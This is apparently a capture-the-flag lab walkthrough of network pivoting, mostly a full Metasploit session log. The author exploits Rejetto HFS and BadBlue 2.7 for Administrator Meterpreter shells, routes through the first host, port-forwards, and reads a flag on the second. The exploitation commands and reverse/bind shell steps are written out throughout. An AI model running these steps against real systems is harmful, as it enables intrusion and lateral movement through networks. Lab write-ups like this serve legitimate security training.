- Pivoting is a post exploitation technique that involves utilizing a compromised host to attack other systems on the compromised hosts private internal network.
- After gaining access to one host, we can use the compromised host to exploit other hosts on the same network to which we could not access previously.
- Meterpreter provides us with the ability to add a network route to the internal network's subnet and consequently scan and exploit other systems on the network.

```
root@attackdefense:~# cat /root/Desktop/target 
Victim Machine 1 : 10.5.29.222
Victim Machine 2 : 10.5.18.119
root@attackdefense:~# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.1.0.4  netmask 255.255.0.0  broadcast 10.1.255.255
        ether 02:42:0a:01:00:04  txqueuelen 0  (Ethernet)
        RX packets 3199  bytes 273832 (267.4 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 3705  bytes 2656430 (2.5 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.12.3  netmask 255.255.255.0  broadcast 10.10.12.255
        ether 02:42:0a:0a:0c:03  txqueuelen 0  (Ethernet)
        RX packets 11  bytes 866 (866.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 8713  bytes 30825937 (29.3 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 8713  bytes 30825937 (29.3 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@attackdefense:~# ping -c 5 10.5.29.222
PING 10.5.29.222 (10.5.29.222) 56(84) bytes of data.
64 bytes from 10.5.29.222: icmp_seq=1 ttl=125 time=2.50 ms
64 bytes from 10.5.29.222: icmp_seq=2 ttl=125 time=1.79 ms
64 bytes from 10.5.29.222: icmp_seq=3 ttl=125 time=1.79 ms
64 bytes from 10.5.29.222: icmp_seq=4 ttl=125 time=1.73 ms
64 bytes from 10.5.29.222: icmp_seq=5 ttl=125 time=1.71 ms

--- 10.5.29.222 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 4007ms
rtt min/avg/max/mdev = 1.707/1.902/2.496/0.298 ms
root@attackdefense:~# ping -c 5 10.5.18.119
PING 10.5.18.119 (10.5.18.119) 56(84) bytes of data.

--- 10.5.18.119 ping statistics ---
5 packets transmitted, 0 received, 100% packet loss, time 4073ms

root@attackdefense:~# service postgresql start && msfconsole
Starting PostgreSQL 13 database server: main.
       =[ metasploit v6.1.0-dev                           ]
+ -- --=[ 2160 exploits - 1146 auxiliary - 367 post       ]
+ -- --=[ 596 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 8 evasion                                       ]

Metasploit tip: To save all commands executed since start up 
to a file, use the makerc command

msf6 > db_status
[*] Connected to msf. Connection type: postgresql.
msf6 > workspace -a pivoting
[*] Added workspace: pivoting
[*] Workspace: pivoting
msf6 > db_nmap -sV 10.5.29.222
[*] Nmap: Starting Nmap 7.91 ( https://nmap.org ) at 2023-08-08 02:38 IST
[*] Nmap: Nmap scan report for 10.5.29.222
[*] Nmap: Host is up (0.0018s latency).
[*] Nmap: Not shown: 989 closed ports
[*] Nmap: PORT      STATE SERVICE            VERSION
[*] Nmap: 80/tcp    open  http               HttpFileServer httpd 2.3
[*] Nmap: 135/tcp   open  msrpc              Microsoft Windows RPC
[*] Nmap: 139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
[*] Nmap: 445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
[*] Nmap: 3389/tcp  open  ssl/ms-wbt-server?
[*] Nmap: 49152/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49153/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49154/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49155/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49165/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49176/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 66.76 seconds
msf6 > search type:exploit name:rejetto

Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/rejetto_hfs_exec

msf6 > use exploit/windows/http/rejetto_hfs_exec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/rejetto_hfs_exec) > options

Module options (exploit/windows/http/rejetto_hfs_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   HTTPDELAY  10               no        Seconds to wait before terminating web server
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The path of the web application
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.12.3       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(windows/http/rejetto_hfs_exec) > set rhosts 10.5.29.222
rhosts => 10.5.29.222
msf6 exploit(windows/http/rejetto_hfs_exec) > run

[*] Started reverse TCP handler on 10.10.12.3:4444 
[*] Using URL: http://0.0.0.0:8080/PQED9G
[*] Local IP: http://10.10.12.3:8080/PQED9G
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /PQED9G
[*] Sending stage (175174 bytes) to 10.5.29.222
[!] Tried to delete %TEMP%\xccPCDeoYl.vbs, unknown result
[*] Meterpreter session 1 opened (10.10.12.3:4444 -> 10.5.29.222:49227) at 2023-08-08 02:40:34 +0530
[*] Server stopped.

meterpreter > getuid
Server username: WIN-OMCNBKR66MN\Administrator
meterpreter > sysinfo
Computer        : WIN-OMCNBKR66MN
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter > ipconfig

Interface  1
============
Name         : Software Loopback Interface 1
Hardware MAC : 00:00:00:00:00:00
MTU          : 4294967295
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0
IPv6 Address : ::1
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff


Interface 12
============
Name         : AWS PV Network Device #0
Hardware MAC : 02:48:72:ad:cd:50
MTU          : 9001
IPv4 Address : 10.5.29.222
IPv4 Netmask : 255.255.240.0
IPv6 Address : fe80::e460:2032:100:78bf
IPv6 Netmask : ffff:ffff:ffff:ffff::


Interface 24
============
Name         : Microsoft ISATAP Adapter #2
Hardware MAC : 00:00:00:00:00:00
MTU          : 1280
IPv6 Address : fe80::5efe:a05:1dde
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff

meterpreter > run autoroute -s 10.5.29.0/20

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 10.5.29.0/255.255.240.0...
[+] Added route to 10.5.29.0/255.255.240.0 via 10.5.29.222
[*] Use the -p option to list all active routes
meterpreter > bg
[*] Backgrounding session 1...
msf6 exploit(windows/http/rejetto_hfs_exec) > sessions

Active sessions
===============

  Id  Name  Type                     Information                                      Connection
  --  ----  ----                     -----------                                      ----------
  1         meterpreter x86/windows  WIN-OMCNBKR66MN\Administrator @ WIN-OMCNBKR66MN  10.10.12.3:4444 -> 10.5.29.222:49227 (10.5.29.222)

msf6 exploit(windows/http/rejetto_hfs_exec) > sessions -n victim1 -i 1
[*] Session 1 named to victim1
msf6 exploit(windows/http/rejetto_hfs_exec) > sessions

Active sessions
===============

  Id  Name     Type                     Information                                      Connection
  --  ----     ----                     -----------                                      ----------
  1   victim1  meterpreter x86/windows  WIN-OMCNBKR66MN\Administrator @ WIN-OMCNBKR66MN  10.10.12.3:4444 -> 10.5.29.222:49227 (10.5.29.222)

msf6 exploit(windows/http/rejetto_hfs_exec) > search postscan
[-] No results from search
msf6 exploit(windows/http/rejetto_hfs_exec) > search portscan

Matching Modules
================

   #  Name                                              Disclosure Date  Rank    Check  Description
   -  ----                                              ---------------  ----    -----  -----------
   0  auxiliary/scanner/portscan/ftpbounce                               normal  No     FTP Bounce Port Scanner
   1  auxiliary/scanner/natpmp/natpmp_portscan                           normal  No     NAT-PMP External Port Scanner
   2  auxiliary/scanner/sap/sap_router_portscanner                       normal  No     SAPRouter Port Scanner
   3  auxiliary/scanner/portscan/xmas                                    normal  No     TCP "XMas" Port Scanner
   4  auxiliary/scanner/portscan/ack                                     normal  No     TCP ACK Firewall Scanner
   5  auxiliary/scanner/portscan/tcp                                     normal  No     TCP Port Scanner
   6  auxiliary/scanner/portscan/syn                                     normal  No     TCP SYN Port Scanner
   7  auxiliary/scanner/http/wordpress_pingback_access                   normal  No     Wordpress Pingback Locator


Interact with a module by name or index. For example info 7, use 7 or use auxiliary/scanner/http/wordpress_pingback_access

msf6 exploit(windows/http/rejetto_hfs_exec) > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > set rhosts 10.5.18.119
rhosts => 10.5.18.119
msf6 auxiliary(scanner/portscan/tcp) > options

Module options (auxiliary/scanner/portscan/tcp):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   CONCURRENCY  10               yes       The number of concurrent ports to check per host
   DELAY        0                yes       The delay between connections, per thread, in milliseconds
   JITTER       0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.
   PORTS        1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)
   RHOSTS       10.5.18.119      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   THREADS      1                yes       The number of concurrent threads (max one per host)
   TIMEOUT      1000             yes       The socket connect timeout in milliseconds

msf6 auxiliary(scanner/portscan/tcp) > set ports 1-1000
ports => 1-1000
msf6 auxiliary(scanner/portscan/tcp) > run

[+] 10.5.18.119:          - 10.5.18.119:80 - TCP OPEN
[+] 10.5.18.119:          - 10.5.18.119:135 - TCP OPEN
[+] 10.5.18.119:          - 10.5.18.119:139 - TCP OPEN
[+] 10.5.18.119:          - 10.5.18.119:445 - TCP OPEN
^C[*] 10.5.18.119:          - Caught interrupt from the console...
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/portscan/tcp) > sessions

Active sessions
===============

  Id  Name     Type                     Information                                      Connection
  --  ----     ----                     -----------                                      ----------
  1   victim1  meterpreter x86/windows  WIN-OMCNBKR66MN\Administrator @ WIN-OMCNBKR66MN  10.10.12.3:4444 -> 10.5.29.222:49227 (10.5.29.222)

msf6 auxiliary(scanner/portscan/tcp) > sessions 1
[*] Starting interaction with victim1...

meterpreter > portfwd add -l 1234 -p 80 -r 10.5.18.119
[*] Local TCP relay created: :1234 <-> 10.5.18.119:80
meterpreter > bg
[*] Backgrounding session victim1...
msf6 auxiliary(scanner/portscan/tcp) > db_nmap -sS -sV -p 1234 localhost
[*] Nmap: Starting Nmap 7.91 ( https://nmap.org ) at 2023-08-08 02:48 IST
[*] Nmap: Nmap scan report for localhost (127.0.0.1)
[*] Nmap: Host is up (0.000039s latency).
[*] Nmap: Other addresses for localhost (not scanned): ::1
[*] Nmap: PORT     STATE SERVICE VERSION
[*] Nmap: 1234/tcp open  http    BadBlue httpd 2.7
[*] Nmap: Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 16.13 seconds
msf6 auxiliary(scanner/portscan/tcp) > search badblue

Matching Modules
================

   #  Name                                       Disclosure Date  Rank   Check  Description
   -  ----                                       ---------------  ----   -----  -----------
   0  exploit/windows/http/badblue_ext_overflow  2003-04-20       great  Yes    BadBlue 2.5 EXT.dll Buffer Overflow
   1  exploit/windows/http/badblue_passthru      2007-12-10       great  No     BadBlue 2.72b PassThru Buffer Overflow


Interact with a module by name or index. For example info 1, use 1 or use exploit/windows/http/badblue_passthru

msf6 auxiliary(scanner/portscan/tcp) > use exploit/windows/http/badblue_passthru
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/badblue_passthru) > set payload windows/meterpreter/bind_tcp
payload => windows/meterpreter/bind_tcp
msf6 exploit(windows/http/badblue_passthru) > options

Module options (exploit/windows/http/badblue_passthru):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    80               yes       The target port (TCP)
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   VHOST                     no        HTTP server virtual host


Payload options (windows/meterpreter/bind_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LPORT     4444             yes       The listen port
   RHOST                      no        The target address


Exploit target:

   Id  Name
   --  ----
   0   BadBlue EE 2.7 Universal


msf6 exploit(windows/http/badblue_passthru) > ser rhosts 10.5.18.119
[-] Unknown command: ser
msf6 exploit(windows/http/badblue_passthru) > set rhosts 10.5.18.119
rhosts => 10.5.18.119
msf6 exploit(windows/http/badblue_passthru) > set lport 4433
lport => 4433
msf6 exploit(windows/http/badblue_passthru) > set target 
set target 0                            set target 1                            set target BadBlue\ 2.72b\ Universal    set target BadBlue\ EE\ 2.7\ Universal  
msf6 exploit(windows/http/badblue_passthru) > set target 
set target 0                            set target 1                            set target BadBlue\ 2.72b\ Universal    set target BadBlue\ EE\ 2.7\ Universal  
msf6 exploit(windows/http/badblue_passthru) > set target BadBlue\ EE\ 2.7\ Universal
target => BadBlue EE 2.7 Universal
msf6 exploit(windows/http/badblue_passthru) > run

[*] Trying target BadBlue EE 2.7 Universal...
[*] Started bind TCP handler against 10.5.18.119:4433
[*] Sending stage (175174 bytes) to 10.5.18.119
[*] Meterpreter session 2 opened (10.5.29.222:49952 -> 10.5.18.119:4433) at 2023-08-08 02:52:30 +0530

meterpreter > getuid
Server username: ATTACKDEFENSE\Administrator
meterpreter > sysinfo
Computer        : ATTACKDEFENSE
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter > bg
[*] Backgrounding session 2...
msf6 exploit(windows/http/badblue_passthru) > sessions

Active sessions
===============

  Id  Name     Type                     Information                                      Connection
  --  ----     ----                     -----------                                      ----------
  1   victim1  meterpreter x86/windows  WIN-OMCNBKR66MN\Administrator @ WIN-OMCNBKR66MN  10.10.12.3:4444 -> 10.5.29.222:49227 (10.5.29.222)
  2            meterpreter x86/windows  ATTACKDEFENSE\Administrator @ ATTACKDEFENSE      10.5.29.222:49952 -> 10.5.18.119:4433 (10.5.18.119)

msf6 exploit(windows/http/badblue_passthru) > sessions -n victim2 -i 2
[*] Session 2 named to victim2
msf6 exploit(windows/http/badblue_passthru) > sessions

Active sessions
===============

  Id  Name     Type                     Information                                      Connection
  --  ----     ----                     -----------                                      ----------
  1   victim1  meterpreter x86/windows  WIN-OMCNBKR66MN\Administrator @ WIN-OMCNBKR66MN  10.10.12.3:4444 -> 10.5.29.222:49227 (10.5.29.222)
  2   victim2  meterpreter x86/windows  ATTACKDEFENSE\Administrator @ ATTACKDEFENSE      10.5.29.222:49952 -> 10.5.18.119:4433 (10.5.18.119)

msf6 exploit(windows/http/badblue_passthru) > sessions -h
Usage: sessions [options] or sessions [id]

Active session manipulation and interaction.

OPTIONS:

    -C <opt>  Run a Meterpreter Command on the session given with -i, or all
    -K        Terminate all sessions
    -S <opt>  Row search filter.
    -c <opt>  Run a command on the session given with -i, or all
    -d        List all inactive sessions
    -h        Help banner
    -i <opt>  Interact with the supplied session ID
    -k <opt>  Terminate sessions by session ID and/or range
    -l        List all active sessions
    -n <opt>  Name or rename a session by ID
    -q        Quiet mode
    -s <opt>  Run a script or module on the session given with -i, or all
    -t <opt>  Set a response timeout (default: 15)
    -u <opt>  Upgrade a shell to a meterpreter session on many platforms
    -v        List all active sessions in verbose mode
    -x        Show extended information in the session table

Many options allow specifying session ranges using commas and dashes.
For example:  sessions -s checkvm -i 1,3-5  or  sessions -k 1-2,5,6

msf6 exploit(windows/http/badblue_passthru) > sessions -c sysinfo -i 1
[*] Running 'sysinfo' on meterpreter session 1 (10.5.29.222)
[-] Failed: Rex::Post::Meterpreter::RequestError stdapi_sys_process_execute: Operation failed: The system cannot find the file specified.
msf6 exploit(windows/http/badblue_passthru) > sessions -c sysinfo
[*] Running 'sysinfo' on meterpreter session 1 (10.5.29.222)
[-] Failed: Rex::Post::Meterpreter::RequestError stdapi_sys_process_execute: Operation failed: The system cannot find the file specified.
[*] Running 'sysinfo' on meterpreter session 2 (10.5.18.119)
[-] Failed: Rex::Post::Meterpreter::RequestError stdapi_sys_process_execute: Operation failed: The system cannot find the file specified.
msf6 exploit(windows/http/badblue_passthru) > sessions 1
[*] Starting interaction with victim1...

meterpreter > cd /
meterpreter > ls
Listing: C:\
============

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
40777/rwxrwxrwx   0       dir   2020-08-12 09:43:47 +0530  $Recycle.Bin
100666/rw-rw-rw-  1       fil   2013-08-22 21:16:48 +0530  BOOTNXT
40777/rwxrwxrwx   0       dir   2013-08-22 20:18:41 +0530  Documents and Settings
40777/rwxrwxrwx   0       dir   2013-08-22 21:09:30 +0530  PerfLogs
40555/r-xr-xr-x   4096    dir   2013-08-22 19:06:16 +0530  Program Files
40777/rwxrwxrwx   4096    dir   2013-08-22 19:06:16 +0530  Program Files (x86)
40777/rwxrwxrwx   4096    dir   2013-08-22 19:06:16 +0530  ProgramData
40777/rwxrwxrwx   0       dir   2020-09-05 09:16:25 +0530  System Volume Information
40555/r-xr-xr-x   4096    dir   2013-08-22 19:06:16 +0530  Users
40777/rwxrwxrwx   24576   dir   2013-08-22 19:06:16 +0530  Windows
100444/r--r--r--  398356  fil   2013-08-22 21:16:48 +0530  bootmgr
0000/---------    0       fif   1970-01-01 05:30:00 +0530  pagefile.sys

meterpreter > bg
[*] Backgrounding session victim1...
msf6 exploit(windows/http/badblue_passthru) > sessions 2
[*] Starting interaction with victim2...
meterpreter > cd /
meterpreter > cat flag.txt 
c46d12f28d87ae0b92b05ebd9fb8e817
meterpreter >
```